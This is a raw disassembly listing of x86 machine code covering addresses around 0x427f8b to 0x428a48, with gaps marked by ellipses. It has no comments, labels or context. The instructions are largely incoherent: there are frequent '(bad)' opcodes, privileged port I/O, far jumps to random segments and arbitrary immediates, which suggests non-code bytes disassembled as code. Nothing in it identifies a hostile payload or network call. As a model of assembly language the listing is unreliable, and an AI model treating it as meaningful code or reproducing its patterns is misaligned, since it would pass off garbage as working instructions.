  427f8b:	mov    esi,0xab58a828
  427f90:	shl    DWORD PTR [edx+0x32],1
  427f93:	dec    ebp
  427f94:	dec    esp
  427f95:	ja     0x427f17
  427f97:	xchg   edi,eax
  427f98:	or     ch,BYTE PTR [ecx-0x2]
  427f9b:	lahf   
  427f9c:	or     al,0xce
  427f9e:	inc    ecx
  427f9f:	(bad)  
  427fa0:	aas    
  427fa1:	sbb    al,0xdc
  427fa3:	sub    eax,0x829923d4
  427fa8:	fsubr  DWORD PTR [ebx-0x67]
  427fab:	mov    ebx,ebx
  427fad:	or     eax,esp
  427faf:	clc    
  427fb0:	ja     0x428009
  427fb2:	inc    ebp
  427fb3:	xor    cl,BYTE PTR [esi+0x33d3c2a1]
  427fb9:	lds    esp,FWORD PTR [edi-0x7f]
  427fbc:	inc    ebx
  427fbd:	test   BYTE PTR [ebp+0x63],al
  427fc0:	sti    
  427fc1:	push   es
  427fc2:	push   cs
  427fc3:	(bad)  
  427fc5:	sbb    ecx,DWORD PTR ds:0xfbcee8d1
  427fcb:	ret    0x6f0d
  427fce:	ss mov esp,0xfea17020
  427fd4:	imul   ebx,edx,0x457cc1f6
  427fda:	dec    eax
  427fdb:	ret    
  427fdc:	xchg   ebp,eax
  427fdd:	rol    BYTE PTR [edi+0x52],0xf2
  427fe1:	pop    ebx
  427fe2:	sbb    esp,eax
  427fe4:	and    al,0x53
  427fe6:	pop    eax
  427fe7:	or     edi,DWORD PTR [edi+ebx*8+0x616fa2]
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	cmp    BYTE PTR [ebx+ebp*4],dh
  428065:	mov    BYTE PTR [ecx-0xfffe54],dl
  42806b:	add    BYTE PTR [eax],al
  42806d:	add    BYTE PTR [edi+0x6a],bh
  428070:	shr    eax,1
  428072:	xchg   ebx,eax
  428073:	inc    ebx
  428074:	clc    
  428075:	xchg   edx,eax
  428076:	sahf   
  428077:	test   eax,0x6bae554c
  42807c:	inc    edi
  42807d:	pop    ebp
  42807e:	inc    esi
  42807f:	rcr    ecx,0xae
  428082:	cmp    DWORD PTR [eax-0x63e25fdb],esp
  428088:	push   cs
  428089:	test   al,0x24
  42808b:	scas   al,BYTE PTR es:[edi]
  42808c:	je     0x428019
  42808e:	mov    eax,0xd66d9ce4
  428093:	sbb    al,0x88
  428095:	test   eax,0xe7b9d90b
  42809a:	in     eax,dx
  42809b:	sub    bl,al
  42809d:	or     DWORD PTR [edi+0xf95534a],ebp
  4280a3:	stos   BYTE PTR es:[edi],al
  4280a4:	(bad)  
  4280a5:	ja     0x428078
  4280a7:	fninit 
  4280a9:	or     edx,DWORD PTR [eax]
  4280ab:	lea    ecx,[esi-0x6b]
  4280ae:	cmp    ecx,DWORD PTR [eax+0x3f117ad0]
  4280b4:	and    DWORD PTR [edx],0xfe5a5701
  4280ba:	arpl   WORD PTR [edx+0x27],di
  4280bd:	jmp    0xc275d126
  4280c2:	mov    ebx,0x4bc6da56
  4280c7:	std    
  4280c8:	sbb    al,0xc
  4280ca:	fst    QWORD PTR [edx]
  4280cc:	push   eax
  4280cd:	leave  
  4280ce:	jmp    0x9220:0x69f76af2
  4280d5:	repz inc BYTE PTR [eax+0x7d27515]
  4280dc:	mov    esp,edx
  4280de:	dec    ebx
  4280df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280e0:	mov    ds:0xeeb9dca5,eax
  4280e5:	lods   eax,DWORD PTR ds:[esi]
  4280e6:	add    al,0x5e
  4280e8:	out    0xfa,eax
  4280ea:	jecxz  0x42814c
  4280ec:	popf   
  4280ed:	in     al,dx
  4280ee:	xchg   DWORD PTR [ebx],ebp
  4280f0:	out    0x6e,eax
  4280f2:	sti    
  4280f3:	icebp  
  4280f4:	(bad)  
  4280f6:	lahf   
  4280f7:	xchg   ebp,eax
  4280f8:	bound  edx,QWORD PTR [esi]
  4280fa:	mov    esi,0xf2f96069
  4280ff:	mov    al,ds:0x88b787b9
  428104:	mov    DWORD PTR [edx+0x35e3c147],edx
  42810a:	pop    esi
  42810b:	aas    
  42810c:	and    bl,BYTE PTR [edi]
  42810e:	mov    cl,0x15
  428110:	test   BYTE PTR [edi+eiz*2-0x5d],dh
  428114:	inc    ebp
  428115:	rcl    BYTE PTR [ecx],1
  428117:	popf   
  428118:	xchg   edx,edi
  42811a:	lea    ax,[ebp-0xa]
  42811e:	xchg   esp,eax
  42811f:	cmovl  edi,DWORD PTR [edi+0x46]
  428123:	push   ebp
  428124:	cli    
  428125:	test   al,0x29
  428127:	or     al,0xc4
  428129:	push   cs
  42812a:	or     al,0xb4
  42812c:	(bad)  
  42812d:	daa    
  42812e:	xchg   ebp,eax
  42812f:	cs cwde 
  428131:	inc    ecx
  428132:	xchg   edi,eax
  428133:	dec    esi
  428134:	or     eax,0xdaac8fc3
  428139:	fs mov ah,0x6
  42813c:	mov    dl,0x74
  42813e:	scas   eax,DWORD PTR es:[edi]
  42813f:	fisttp QWORD PTR [edx]
  428141:	mul    esp
  428143:	sub    bh,dl
  428145:	retf   
  428146:	test   al,0xe6
  428148:	fistp  QWORD PTR [edi]
  42814a:	pop    ebx
  42814b:	stos   BYTE PTR es:[edi],al
  42814c:	dec    esp
  42814d:	jmp    0x428197
  42814f:	xchg   edx,edx
  428151:	nop
  428152:	and    al,BYTE PTR [edx+0x4bb7a64e]
  428158:	popa   
  428159:	mov    al,0x8
  42815b:	jge    0x4280ed
  42815d:	scas   eax,DWORD PTR es:[edi]
  42815e:	(bad)  
  428160:	fdivr  st(1),st
  428162:	dec    ebp
  428163:	mov    esp,0x54f86703
  428168:	sub    DWORD PTR [edi],0x4
  42816b:	pusha  
  42816c:	or     eax,DWORD PTR [eax]
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	adc    DWORD PTR [eax+0x47],esi
  4281e5:	inc    edi
  4281e6:	nop
  4281e7:	lods   eax,DWORD PTR ds:[esi]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	inc    DWORD PTR [eax]
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	jns    0x428170
  4281f0:	fs mov bl,0x23
  4281f3:	mov    esp,0x2f01861c
  4281f8:	loopne 0x4281b4
  4281fa:	aad    0x71
  4281fc:	or     BYTE PTR cs:[edi-0xef1b550],0xe4
  428204:	jne    0x42819c
  428206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428207:	jge    0x42825a
  428209:	mov    dl,0xe9
  42820b:	enter  0x8a2f,0xd3
  42820f:	push   edx
  428210:	or     ch,BYTE PTR [edi+0x4]
  428213:	mov    ebp,0xc427e0a
  428218:	std    
  428219:	lds    ecx,FWORD PTR [edi-0x3733a713]
  42821f:	push   ebx
  428220:	pcmpgtd mm6,mm0
  428223:	mov    ds:0x52d8ccd5,eax
  428228:	mov    bh,0x89
  42822a:	adc    BYTE PTR [ecx-0xfe50fbb],dl
  428230:	mov    ch,BYTE PTR [edi+0xf3a7118]
  428236:	pop    es
  428237:	in     al,0xa0
  428239:	xchg   ebp,eax
  42823a:	adc    BYTE PTR [ecx],ah
  42823c:	dec    ecx
  42823d:	(bad)  
  42823e:	jecxz  0x428204
  428240:	mov    es,WORD PTR [esi-0x55]
  428243:	lahf   
  428244:	ret    
  428245:	jnp    0x428202
  428247:	push   esi
  428248:	sub    dl,BYTE PTR [edx+0x1a5649de]
  42824e:	jo     0x42823d
  428250:	in     eax,dx
  428251:	sti    
  428252:	pushf  
  428253:	push   esp
  428254:	xor    DWORD PTR [ebp+0x72],0xffffffb5
  428258:	popa   
  428259:	call   DWORD PTR [eax-0x3b51ebfe]
  42825f:	test   DWORD PTR [eax],esi
  428261:	out    dx,eax
  428262:	mov    ebx,0xa9600eb8
  428267:	jns    0x428222
  428269:	sbb    bh,BYTE PTR [ebx]
  42826b:	aam    0xb4
  42826d:	mov    dl,0x90
  42826f:	imul   edx,DWORD PTR [edx+0x62],0x6b
  428273:	(bad)  
  428274:	jnp    0x428262
  428276:	xchg   edi,eax
  428277:	repnz mov bl,bl
  42827a:	ds pop edx
  42827c:	lahf   
  42827d:	xchg   ebx,eax
  42827e:	jmp    0x4fcb7ea0
  428283:	pop    es
  428284:	mov    esp,0xf6f385a6
  428289:	push   esi
  42828a:	dec    ebx
  42828b:	cmp    BYTE PTR [ebp+0x55],cl
  42828e:	sub    eax,0x10d6dea7
  428293:	sub    DWORD PTR [edi],0x5f59f6db
  428299:	adc    edi,DWORD PTR [ecx+esi*8]
  42829c:	xor    dh,BYTE PTR [ebx+edi*8]
  42829f:	pop    es
  4282a0:	and    BYTE PTR [esp+edx*1],0x93
  4282a4:	pop    esi
  4282a5:	repnz out dx,eax
  4282a7:	inc    ebx
  4282a8:	and    eax,0xc5d9fcd7
  4282ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282ae:	sahf   
  4282af:	lods   eax,DWORD PTR ds:[esi]
  4282b0:	mov    cl,0x19
  4282b2:	mov    edi,0xf50fbf32
  4282b7:	js     0x4282da
  4282b9:	stc    
  4282ba:	push   eax
  4282bb:	push   esi
  4282bc:	test   DWORD PTR [edx],edi
  4282be:	add    eax,0x8b0af295
  4282c3:	adc    al,0x55
  4282c5:	mov    ch,0x8f
  4282c7:	sbb    esp,DWORD PTR [edi]
  4282c9:	pop    edx
  4282ca:	push   edx
  4282cb:	sub    edi,ebx
  4282cd:	mov    dl,0x49
  4282cf:	dec    esi
  4282d0:	mov    ds:0xe78ba619,eax
  4282d5:	loopne 0x428309
  4282d7:	xchg   edi,eax
  4282d8:	(bad)  [ecx*1-0x1d8d20a1]
  4282df:	out    dx,al
  4282e0:	(bad)  
  4282e1:	push   ss
  4282e2:	fistp  WORD PTR [eax]
  4282e4:	xchg   ebx,eax
  4282e5:	retf   0xa26f
  4282e8:	push   esp
  4282e9:	into   
  4282ea:	outs   dx,BYTE PTR ds:[esi]
  4282eb:	sbb    al,0x1c
	...
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	inc    edi
  428363:	or     bl,BYTE PTR [ebp-0x6b]
  428366:	(bad)  
  428367:	scas   al,BYTE PTR es:[edi]
  428368:	add    DWORD PTR [eax],eax
  42836a:	inc    DWORD PTR [eax]
  42836c:	add    BYTE PTR [eax],al
  42836e:	shr    DWORD PTR [esi],cl
  428370:	mov    BYTE PTR [edx-0x168b348b],0x98
  428377:	jmp    0x2478:0x390950a9
  42837e:	inc    ecx
  42837f:	jnp    0x428309
  428381:	add    BYTE PTR [ebp+eax*1-0x5c2ebc47],ch
  428388:	je     0x428349
  42838a:	mov    al,ds:0xbdca2410
  42838f:	loop   0x428381
  428391:	(bad)  
  428393:	daa    
  428394:	fdivr  DWORD PTR [edx+0x60d01f23]
  42839a:	dec    eax
  42839b:	jp     0x42838a
  42839d:	inc    esi
  42839e:	sbb    eax,0x8c0a2d3d
  4283a3:	loopne 0x42834c
  4283a5:	jbe    0x4283ad
  4283a7:	mov    al,0x14
  4283a9:	loop   0x42836c
  4283ab:	repz mov bh,0x9d
  4283ae:	rol    bh,0x24
  4283b1:	enter  0x3432,0xdf
  4283b5:	push   0xffffffba
  4283b7:	les    ebx,FWORD PTR [edx-0x32c5cc57]
  4283bd:	mov    ds:0xbc0c602d,eax
  4283c2:	scas   eax,DWORD PTR es:[edi]
  4283c3:	jg     0x42837e
  4283c5:	push   esp
  4283c6:	das    
  4283c7:	(bad)  
  4283c9:	and    DWORD PTR [edx-0x6c],0xae86b7ae
  4283d0:	mov    ds:0xc22f4aa8,eax
  4283d5:	mov    ebx,0xff971d49
  4283da:	or     eax,ebx
  4283dc:	aas    
  4283dd:	xor    esp,DWORD PTR [esi+eax*8-0x31d139ec]
  4283e4:	rol    DWORD PTR [edi+0x71],1
  4283e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283e8:	jp     0x428454
  4283ea:	mov    esi,fs
  4283ec:	nop
  4283ed:	iret   
  4283ee:	jl     0x428439
  4283f0:	jnp    0x4283e7
  4283f2:	mov    edx,0x2d9db480
  4283f7:	mov    al,ds:0x3db1e3a6
  4283fc:	imul   eax,ebx,0x9f67e6b4
  428402:	jle    0x4283c1
  428404:	mov    esp,0x6e46f11d
  428409:	xlat   BYTE PTR ds:[ebx]
  42840a:	pop    esi
  42840b:	inc    eax
  42840c:	cdq    
  42840d:	add    al,0xc7
  42840f:	dec    edi
  428410:	push   ebx
  428411:	sbb    esi,esp
  428413:	push   0xf6d22cb7
  428418:	repz in eax,dx
  42841a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42841b:	aaa    
  42841c:	sbb    al,0xc0
  42841e:	dec    ebp
  42841f:	dec    edx
  428420:	stos   BYTE PTR es:[edi],al
  428421:	test   DWORD PTR [esi-0x74c0f604],ebx
  428427:	nop
  428428:	test   al,0xf
  42842a:	sub    BYTE PTR ds:0xf17b9d17,al
  428430:	je     0x428420
  428432:	dec    ecx
  428433:	pop    edx
  428434:	adc    eax,0x5353d87d
  428439:	stos   DWORD PTR es:[edi],eax
  42843a:	enter  0x5fa4,0xf
  42843e:	jp     0x4283da
  428440:	aas    
  428441:	jno    0x428442
  428443:	cdq    
  428444:	imul   ebx,DWORD PTR [edi-0x4e],0xfe43345a
  42844b:	mov    ebx,0x330a71ff
  428450:	xor    DWORD PTR [esi-0x3ecd3dbc],ebx
  428456:	sub    BYTE PTR [ecx],dl
  428458:	call   0xc7e6:0x56423b98
  42845f:	fidiv  DWORD PTR [edi]
  428461:	test   eax,0x6e1e379
  428466:	ss sub eax,0xdc20449c
  42846c:	sub    eax,DWORD PTR [eax]
	...
  4284d6:	push   cs
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x60abfb32
  4284e3:	shl    DWORD PTR [esi+0x1af8e9e],1
  4284e9:	add    bh,bh
  4284eb:	add    BYTE PTR [eax],al
  4284ed:	add    BYTE PTR [esi+0x5],dh
  4284f0:	inc    ebx
  4284f1:	fild   QWORD PTR [ecx-0x5a]
  4284f4:	hlt    
  4284f5:	fild   QWORD PTR [edi]
  4284f7:	repz shl eax,1
  4284fa:	mov    al,BYTE PTR [esi-0x19]
  4284fd:	mov    WORD PTR ds:0xbd28822f,?
  428503:	jle    0x428568
  428505:	je     0x4284bb
  428507:	sub    BYTE PTR [ebp-0x1287e4bd],ch
  42850d:	xor    BYTE PTR [ebp+0x229c7cd3],ch
  428513:	mul    DWORD PTR [ebx+edi*2-0x1d]
  428517:	pop    esp
  428518:	test   DWORD PTR [edx+0x6],ebp
  42851b:	mov    ecx,0xe3adbc78
  428520:	xor    dl,bh
  428522:	std    
  428523:	inc    ebp
  428524:	jl     0x42851b
  428526:	inc    ecx
  428527:	jae    0x428586
  428529:	arpl   WORD PTR [ebx],di
  42852b:	out    dx,eax
  42852c:	adc    BYTE PTR [eax-0x32],bh
  42852f:	inc    ebp
  428530:	mov    al,0x84
  428532:	jge    0x4284df
  428534:	daa    
  428535:	mov    DWORD PTR [esi-0x34],ebx
  428538:	add    DWORD PTR [bp+di-0x5dd3],ebx
  42853d:	stc    
  42853e:	sti    
  42853f:	and    BYTE PTR [esi-0x33],0x75
  428543:	mov    edx,0x7efba72
  428548:	jmp    0x3a61:0x811c0e2a
  42854f:	aas    
  428550:	outs   dx,DWORD PTR ds:[esi]
  428551:	outs   dx,BYTE PTR ds:[esi]
  428552:	dec    eax
  428553:	dec    edx
  428554:	jbe    0x428528
  428556:	daa    
  428557:	and    al,0x31
  428559:	js     0x4285be
  42855b:	adc    dh,BYTE PTR [esi]
  42855d:	and    al,0xe0
  42855f:	scas   al,BYTE PTR es:[edi]
  428560:	jge    0x42859d
  428562:	fimul  WORD PTR [ebx-0x48]
  428565:	mov    BYTE PTR [ecx],0x86
  428568:	push   es
  428569:	or     dl,ch
  42856b:	data16 sar bl,cl
  42856e:	pop    edx
  42856f:	adc    BYTE PTR [eax+0x2d],dl
  428572:	(bad)  
  428573:	sub    bl,BYTE PTR [edi+eax*4+0x46]
  428577:	push   eax
  428578:	and    DWORD PTR [eax-0xc5c77d2],ebp
  42857e:	into   
  42857f:	push   ebp
  428580:	(bad)  
  428581:	test   al,0x58
  428583:	mov    esp,0x85468051
  428588:	nop
  428589:	xor    al,0x3f
  42858b:	ins    DWORD PTR es:[edi],dx
  42858c:	mov    ecx,0xde752f43
  428591:	mov    ebp,0x27e21500
  428596:	or     BYTE PTR [edi],dl
  428598:	ds jecxz 0x42860f
  42859b:	xchg   ecx,eax
  42859c:	pop    ecx
  42859d:	cmp    bl,BYTE PTR ds:0xd1f64536
  4285a3:	(bad)  
  4285a4:	xlat   BYTE PTR ds:[ebx]
  4285a5:	push   0xfffffffe
  4285a7:	adc    DWORD PTR [ebp+edx*1+0x21],edi
  4285ab:	repz xor edx,0xf9cc963b
  4285b2:	mov    edi,0x1d2c39dc
  4285b7:	or     al,BYTE PTR cs:[eax]
  4285ba:	loope  0x4285e6
  4285bc:	rol    DWORD PTR [esi+0x2c10df87],1
  4285c2:	sub    al,0xaa
  4285c4:	jmp    0x42861e
  4285c6:	push   edx
  4285c7:	xor    dh,al
  4285c9:	imul   ebp,DWORD PTR [ebp-0x7d],0x2a
  4285cd:	xor    DWORD PTR [edi-0x6d],esi
  4285d0:	aas    
  4285d1:	push   edx
  4285d2:	xchg   edi,eax
  4285d3:	add    bh,dh
  4285d5:	xchg   DWORD PTR [edi],ebx
  4285d7:	cmp    ah,BYTE PTR [ecx+0x6e]
  4285da:	aas    
  4285db:	sbb    DWORD PTR [edx-0x20],esp
  4285de:	mov    edx,edx
  4285e0:	outs   dx,DWORD PTR ds:[esi]
  4285e1:	dec    ecx
  4285e2:	imul   BYTE PTR [esi]
  4285e4:	push   es
  4285e5:	pop    esi
  4285e6:	jns    0x4285ff
  4285e8:	push   eax
  4285e9:	outs   dx,DWORD PTR ds:[esi]
  4285ea:	pop    esi
  4285eb:	inc    edx
  4285ec:	jne    0x4285ee
	...
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x7061a3f6
  428664:	mov    dl,0xa0
  428666:	lea    esi,[eax+0xff0001]
  42866c:	add    BYTE PTR [eax],al
  42866e:	cmc    
  42866f:	retf   0x5079
  428672:	loope  0x428643
  428674:	dec    edi
  428675:	xchg   edi,eax
  428676:	call   0x1b99:0x5c06d315
  42867d:	ins    BYTE PTR es:[edi],dx
  42867e:	push   edx
  42867f:	dec    eax
  428680:	test   al,dh
  428682:	es aas 
  428684:	dec    esi
  428685:	sub    al,0x1c
  428687:	jle    0x428617
  428689:	std    
  42868a:	or     eax,0xa6d8f4e5
  42868f:	(bad)  
  428690:	(bad)  
  428691:	mov    ebx,0x3603e735
  428696:	imul   esi,DWORD PTR [esi-0x4b],0x57c83fd1
  42869d:	mov    WORD PTR [esi+0x22],cs
  4286a0:	jle    0x428718
  4286a2:	xchg   DWORD PTR [edi+edi*2-0x41b59348],ebp
  4286a9:	call   0x158ea7b8
  4286ae:	pop    ebp
  4286af:	in     al,dx
  4286b0:	(bad)  
  4286b1:	pusha  
  4286b2:	(bad)  
  4286b3:	fstp   DWORD PTR [edx+0x21]
  4286b6:	(bad)  
  4286b7:	cdq    
  4286b8:	call   0xa817:0x2ec4deb1
  4286bf:	jnp    0x428722
  4286c1:	inc    edi
  4286c2:	test   esi,edi
  4286c4:	ret    0x8cb3
  4286c7:	lds    ebp,FWORD PTR [ebp+eax*8-0xce6391c]
  4286ce:	cmp    al,0xf5
  4286d0:	cmp    ecx,DWORD PTR [eax-0x3f2d824a]
  4286d6:	jmp    0x4286cf
  4286d8:	ret    
  4286d9:	test   al,0xf1
  4286db:	ficom  WORD PTR [edx+0xe]
  4286de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286df:	sbb    eax,0x58b74c7f
  4286e4:	rcl    BYTE PTR [esi+ebx*2-0x69],0x58
  4286e9:	add    eax,0x8aa1926a
  4286ee:	stos   DWORD PTR es:[edi],eax
  4286ef:	leave  
  4286f0:	idiv   DWORD PTR [edi-0x3d]
  4286f3:	(bad)  
  4286f4:	dec    eax
  4286f5:	inc    edx
  4286f6:	and    eax,0x2e42d1f4
  4286fb:	scas   eax,DWORD PTR es:[edi]
  4286fc:	push   esi
  4286fd:	or     DWORD PTR [ecx-0x3],ecx
  428700:	hlt    
  428701:	sub    dl,0x2
  428704:	leave  
  428705:	cs dec eax
  428707:	(bad)  
  428708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428709:	push   cs
  42870a:	pop    ds
  42870b:	dec    ecx
  42870c:	out    dx,eax
  42870d:	mov    ecx,0x318e86d8
  428712:	sbb    dl,BYTE PTR [eax+0x3bb12af1]
  428718:	retf   
  428719:	cmp    ebx,DWORD PTR [edi-0x24ec8c2b]
  42871f:	in     eax,dx
  428720:	sbb    bh,bh
  428722:	test   BYTE PTR [edi-0x1039a534],al
  428728:	jle    0x4286cf
  42872a:	mov    edi,eax
  42872c:	sbb    ah,bl
  42872e:	stos   DWORD PTR es:[edi],eax
  42872f:	in     eax,0xd3
  428731:	inc    edx
  428732:	lahf   
  428733:	fcomp  DWORD PTR [edx+0x255ffc81]
  428739:	int    0xd7
  42873b:	push   ecx
  42873c:	sub    BYTE PTR ds:0x73d5a2a,cl
  428742:	pushf  
  428743:	call   0x10928d2
  428748:	adc    al,0xb8
  42874a:	or     edx,edx
  42874c:	xlat   BYTE PTR ds:[ebx]
  42874d:	out    dx,eax
  42874e:	shl    BYTE PTR [edi-0x2a],1
  428751:	jge    0x4287b3
  428753:	(bad)  
  428754:	mov    ebx,0xa272edde
  428759:	inc    eax
  42875a:	mov    ebx,0x80c0d5de
  42875f:	mov    ebp,0x43b5a28
  428764:	pop    ecx
  428765:	pop    ss
  428766:	(bad)
  428769:	(bad)  
  42876a:	or     esi,DWORD PTR [ebx]
  42876c:	or     al,0x0
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x3d7fe7f8
  4287e5:	inc    edx
  4287e6:	mov    WORD PTR [ecx+0xff0001],?
  4287ec:	add    BYTE PTR [eax],al
  4287ee:	out    0x54,eax
  4287f0:	sbb    eax,0x94bde016
  4287f5:	hlt    
  4287f6:	fisubr DWORD PTR [ebp+0x1d017a6f]
  4287fc:	int    0xa6
  4287fe:	xchg   esp,eax
  4287ff:	(bad)  
  428800:	sbb    bh,BYTE PTR [ebx-0xd]
  428803:	mov    ds:0xf229fe14,al
  428808:	mov    ch,0x24
  42880a:	and    DWORD PTR [ebx],ebp
  42880c:	sub    al,0x98
  42880e:	aam    0x2d
  428810:	in     eax,dx
  428811:	out    0x9b,al
  428813:	daa    
  428814:	cmp    bh,BYTE PTR es:[ebx]
  428817:	sar    BYTE PTR [ecx+esi*1-0x1e9d169c],cl
  42881e:	adc    BYTE PTR [eax+0x3b7e370a],cl
  428824:	out    dx,eax
  428825:	pop    esp
  428826:	add    BYTE PTR [esi-0x133a3fba],0xc5
  42882d:	mov    ch,0x5
  42882f:	add    edi,DWORD PTR [ebx-0x31941106]
  428835:	sbb    BYTE PTR [ecx],dl
  428837:	and    DWORD PTR [ebp-0x64ccede8],edi
  42883d:	es fs inc ecx
  428840:	rol    BYTE PTR [ebx-0x2],0xb2
  428844:	ret    0x120e
  428847:	mov    eax,ds:0xe4221116
  42884c:	jns    0x428867
  42884e:	dec    edx
  42884f:	pop    esi
  428850:	out    dx,eax
  428851:	push   esi
  428852:	sub    BYTE PTR [edi],dh
  428854:	inc    esp
  428855:	outs   dx,BYTE PTR ds:[esi]
  428856:	or     DWORD PTR [edi-0x26b9d6f3],0x2f
  42885d:	lea    ebp,ds:0x3c8184d8
  428863:	pop    ss
  428864:	std    
  428865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428866:	std    
  428867:	mov    WORD PTR [ebx+0x71],ds
  42886a:	stos   DWORD PTR es:[edi],eax
  42886b:	in     al,dx
  42886c:	cmp    BYTE PTR [edx-0x71],ah
  42886f:	repz mov ds:0xef5b6b6e,al
  428875:	mov    ds:0x4c51796,al
  42887a:	add    al,0x14
  42887c:	mov    al,ds:0xabbdb5ec
  428881:	xor    DWORD PTR [esi],0x5d
  428884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428885:	inc    ebp
  428886:	mov    edx,0xdc98f611
  42888b:	push   DWORD PTR [ecx-0x34e45a00]
  428891:	or     al,0xa3
  428893:	ja     0x4288e7
  428895:	js     0x4288b7
  428897:	pop    ebp
  428898:	jbe    0x428874
  42889a:	imul   esi,DWORD PTR [esi+0x6bc775d1],0x57
  4288a1:	cdq    
  4288a2:	rcr    BYTE PTR [ecx+0x52a21565],1
  4288a8:	(bad)  
  4288a9:	jae    0x428877
  4288ab:	inc    ecx
  4288ad:	out    0x89,al
  4288af:	inc    esi
  4288b0:	popf   
  4288b1:	fwait
  4288b2:	popa   
  4288b3:	xchg   ebp,eax
  4288b4:	(bad)  
  4288b5:	fisubr DWORD PTR ds:0x8139175d
  4288bb:	pushf  
  4288bc:	mov    ebp,ebp
  4288be:	xchg   esp,eax
  4288bf:	std    
  4288c0:	dec    BYTE PTR [ebp+0x360f9ae4]
  4288c6:	and    esi,eax
  4288c8:	(bad)  
  4288c9:	cmp    al,BYTE PTR [esi]
  4288cb:	rcl    ebp,1
  4288cd:	out    0xfd,al
  4288cf:	push   es
  4288d0:	mov    dl,BYTE PTR [edi+0x35]
  4288d3:	or     eax,0xc295e960
  4288d8:	xor    BYTE PTR [esi],dl
  4288da:	ror    BYTE PTR [ebp+0x706ba3a8],1
  4288e0:	sbb    BYTE PTR [edx-0x13],bh
  4288e3:	mov    ds:0x2a0367f4,al
  4288e8:	xor    esi,ebp
  4288ea:	sbb    eax,0x319
	...
  428953:	add    BYTE PTR [eax],al
  428955:	add    BYTE PTR [esi],ah
  428957:	jp     0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0x9aa9d0f],bx
  428964:	out    0x78,al
  428966:	mov    esi,DWORD PTR [edx+0xff0001]
  42896c:	add    BYTE PTR [eax],al
  42896e:	imul   esi,DWORD PTR [ebx-0x6f3a9af2],0xebae8315
  428978:	add    bh,BYTE PTR [edx+0x19]
  42897b:	push   edi
  42897c:	mov    al,0xf0
  42897e:	xlat   BYTE PTR ds:[ebx]
  42897f:	nop
  428980:	pop    ebx
  428981:	sub    eax,DWORD PTR [ebp+0x5849e8c9]
  428987:	fdiv   DWORD PTR [edi]
  428989:	xchg   esi,eax
  42898a:	daa    
  42898b:	loopne 0x428980
  42898d:	inc    esi
  42898e:	push   edx
  42898f:	sti    
  428990:	and    DWORD PTR [edx+0x6ea2d46d],ebx
  428996:	loope  0x42899d
  428998:	or     dl,0xcf
  42899b:	clc    
  42899c:	push   ecx
  42899d:	adc    DWORD PTR [eax+0xbac2362],ebp
  4289a3:	sub    bl,BYTE PTR [esi-0x6f3ce767]
  4289a9:	nop
  4289aa:	int    0x40
  4289ac:	lds    esp,FWORD PTR [esi-0x7a1308f5]
  4289b2:	jne    0x428a0f
  4289b4:	push   ss
  4289b5:	push   esp
  4289b6:	out    dx,eax
  4289b7:	aaa    
  4289b8:	jg     0x4289dc
  4289ba:	mov    edi,0xa8720fdb
  4289bf:	xor    ecx,0x5e0630f6
  4289c5:	ja     0x4289d2
  4289c7:	fstp   DWORD PTR [esi+0x2]
  4289ca:	addr16 into 
  4289cc:	imul   eax,DWORD PTR [ebx-0x7a],0xe7957397
  4289d3:	neg    BYTE PTR [edi]
  4289d5:	mov    ebp,0xbb896530
  4289da:	mov    ds:0x404efb6c,eax
  4289df:	fwait
  4289e0:	push   0x59
  4289e2:	in     al,dx
  4289e3:	mov    ebx,0x40cce8c3
  4289e8:	sub    esp,DWORD PTR [eax+eax*8-0x7ed80652]
  4289ef:	fucom  st(4)
  4289f1:	jae    0x428a2b
  4289f3:	xchg   cl,bh
  4289f5:	xchg   edx,eax
  4289f6:	(bad)  
  4289f7:	retf   0xb1b
  4289fa:	and    BYTE PTR [edx+ebx*2-0x713515af],0x2a
  428a02:	clc    
  428a03:	addr16 or al,0xaa
  428a06:	or     al,0xea
  428a08:	les    ebp,FWORD PTR [edx]
  428a0a:	pushf  
  428a0b:	pop    es
  428a0c:	adc    DWORD PTR [ecx],esp
  428a0e:	(bad)  
  428a0f:	jp     0x428a3b
  428a11:	cmp    DWORD PTR [ecx-0x5],edi
  428a14:	mov    bh,0x38
  428a16:	fdivp  st(2),st
  428a18:	mov    esp,0x1c962f68
  428a1d:	push   edx
  428a1e:	lock jmp 0x4aa9:0xc9d68610
  428a26:	add    ecx,DWORD PTR [ebp-0x20]
  428a29:	pop    ss
  428a2a:	in     eax,0x36
  428a2c:	sub    al,0xac
  428a2e:	and    eax,0xf1db2514
  428a33:	jp     0x428a49
  428a35:	shl    dh,1
  428a37:	mov    eax,0x6312b00c
  428a3c:	call   0xc2e0:0xf445ed28
  428a43:	add    al,0xb1
  428a45:	lods   al,BYTE PTR ds:[esi]
  428a46:	jb     0x428a8b
  428a48:	fstp   TBYTE PTR [esi]
